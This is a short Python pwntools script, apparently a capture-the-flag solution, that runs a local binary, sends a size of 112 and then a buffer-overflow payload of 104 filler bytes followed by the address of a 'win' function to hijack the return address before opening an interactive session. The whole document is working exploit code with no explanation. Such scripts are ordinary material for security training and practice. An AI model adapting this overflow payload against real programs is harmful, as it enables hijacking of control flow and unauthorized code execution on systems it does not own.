from pwn import *


pro_name = "./"
io = process(pro_name)
io.recvuntil(b"size: ")
win = 0x401c88
payload = b'A'*8*13+p64(win)
io.sendline(b'112')
io.sendline(payload)
io.interactive()
